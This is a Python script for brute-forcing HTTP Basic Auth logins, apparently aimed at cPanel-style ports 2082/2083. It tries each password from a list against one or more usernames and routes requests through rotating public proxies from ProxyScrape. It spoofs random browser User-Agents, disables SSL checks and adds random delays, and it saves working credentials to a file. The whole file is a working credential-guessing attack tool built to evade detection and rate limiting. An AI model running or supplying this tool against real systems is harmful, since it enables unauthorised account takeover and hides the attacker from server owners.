import argparse
import random
import sys
import time
import requests
import os
import urllib3
import json
import base64
from requests.exceptions import ProxyError, Timeout, SSLError, ConnectionError, ConnectTimeout, ChunkedEncodingError

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# A list of User-Agent strings to simulate different browsers
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1'
]

def get_external_ip():
    """Retrieve the external IP address of the current machine."""
    try:
        print("[~] Retrieving external IP address...")
        external_ip = requests.get('https://api.ipify.org').text
        print(f"[~] Detected external IP: {external_ip}")
        return external_ip
    except Exception as e:
        print(f"[!] Failed to retrieve external IP: {e}")
        sys.exit(1)

def fetch_proxies_from_proxyscrape(protocol='http', timeout=10000, country='all', ssl='all', anonymity='all'):
    """Fetch proxies dynamically from ProxyScrape API."""
    url = f"https://api.proxyscrape.com/v2/?request=displayproxies&protocol={protocol}&timeout={timeout}&country={country}&ssl={ssl}&anonymity={anonymity}"
    try:
        print("[~] Fetching proxies from ProxyScrape API...")
        response = requests.get(url)
        proxies = response.text.splitlines()
        print(f"[~] Retrieved {len(proxies)} proxies from ProxyScrape.")
        return proxies
    except Exception as e:
        print(f"[!] Failed to fetch proxies from ProxyScrape: {e}")
        sys.exit(1)

def test_proxy(proxy, proxy_type='http'):
    """Test if a proxy is valid by attempting to connect to an external site."""
    proxy_dict = {
        'http': f'{proxy_type}://{proxy}',
        'https': f'{proxy_type}://{proxy}'
    }
    try:
        response = requests.get('https://api.ipify.org', proxies=proxy_dict, timeout=30)
        print(f"[~] Proxy {proxy} working. IP: {response.text}")
        return True
    except Exception as e:
        print(f"[!] Proxy {proxy} failed: {e}")
        return False

def attempt_bruteforce(host, port, user, passwd, url, proxy_dict, external_ip):
    """Attempt to brute-force using the given credentials."""
    user_agent = random.choice(USER_AGENTS)

    # Manually encode username and password in UTF-8 and base64
    auth_str = f"{user}:{passwd}"
    b64_auth_str = base64.b64encode(auth_str.encode('utf-8')).decode('utf-8')

    try:
        print(f"[~] Trying Username: {user} and Password: {passwd}")
        response = requests.get(
            url,
            proxies=proxy_dict,
            headers={
                'User-Agent': user_agent,
                'Authorization': f'Basic {b64_auth_str}'  # Manually encoded Authorization header
            },
            timeout=60,
            verify=False  # Disable SSL verification
        )
        if response.status_code == 200 and 'welcome' in response.text.lower():
            print(f"[+] SUCCESS: Username: {user}, Password: {passwd}")
            return True  # Username and password are correct
        elif response.status_code == 401:
            print(f"[-] Incorrect: Username '{user}', Password '{passwd}'")
            return False  # Incorrect username/password
        else:
            print(f"[~] HTTP Status: {response.status_code}. Response: {response.text[:200]}")
    except (ProxyError, Timeout, SSLError, ConnectionError, ConnectTimeout, ChunkedEncodingError) as e:
        print(f"[!] Connection failed with error: {e}. Retrying with a different proxy...")
        return False

def process_passwords(passwords_file, usernames, host, port, url, proxies, external_ip, retries, delay):
    """Process passwords and usernames for brute-force."""
    with open(passwords_file, 'r') as password_file:
        print("[~] Starting password brute-force process...")
        for line in password_file:
            passwd = line.strip()
            for user in usernames:
                user = user.strip()
                print(f"[~] Trying Username: {user} and Password: {passwd}")
                for attempt in range(1, retries + 1):
                    print(f"[~] Attempt {attempt} of {retries}")
                    proxy = random.choice(proxies)
                    proxy_dict = {
                        'http': f'http://{proxy}',
                        'https': f'http://{proxy}'
                    }
                    success = attempt_bruteforce(host, port, user, passwd, url, proxy_dict, external_ip)
                    if success:
                        print(f"[+] Found valid credentials: Username: {user}, Password: {passwd}")
                        with open('found.txt', 'w') as outfile:
                            outfile.write(f"Username: {user}, Password: {passwd}\n")
                        sys.exit(0)
                    else:
                        if attempt == 1:
                            print(f"[-] Username '{user}' and Password '{passwd}' failed (401 Unauthorized).")
                            break  # No need to retry after a 401 response
                        else:
                            print(f"[!] Retry attempt {attempt}/{retries} failed.")
                    time.sleep(random.uniform(delay, delay + 2))  # Random delay
    print("[-] No valid username/password combination found.")
    sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Brute-force large password list with username list')
    parser.add_argument('passwords', help='Path to the passwords file (e.g., passwords.txt)')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between attempts (in seconds)')
    parser.add_argument('--retries', type=int, default=3, help='Number of retries on failure')
    args = parser.parse_args()

    # Detect external IP before asking for manual input
    detected_ip = get_external_ip()

    use_detected_ip = input(f"Do you want to use the detected external IP ({detected_ip})? (yes/no): ").strip().lower()
    external_ip = detected_ip if use_detected_ip == 'yes' else input("Enter the external IP manually: ")

    # Fetch proxies dynamically from ProxyScrape API
    proxies = fetch_proxies_from_proxyscrape()

    # Prompt for host, port, and URL
    host = input("Enter the host (e.g., 127.0.0.1): ")
    port = input("Enter the port (e.g., 2082 for non-SSL, 2083 for SSL): ")
    url = input(f"Enter the login URL (e.g., https://{host}:{port}/login): ") or f"https://{host}:{port}/login"

    # Prompt user for usernames
    use_username_file = input("Do you want to select a usernames.txt file? (yes/no): ").strip().lower()
    if use_username_file == 'yes':
        usernames_file = input("Enter the path to the usernames file (e.g., usernames.txt): ")
        try:
            with open(usernames_file, 'r') as file:
                usernames = [line.strip() for line in file.readlines()]
        except FileNotFoundError as e:
            print(f"[!] {e}")
            sys.exit(1)
    else:
        username = input("Enter the username directly: ")
        usernames = [username]

    # Process passwords using the fetched proxies
    process_passwords(args.passwords, usernames, host, port, url, proxies, external_ip, args.retries, args.delay)

if __name__ == '__main__':
    main()
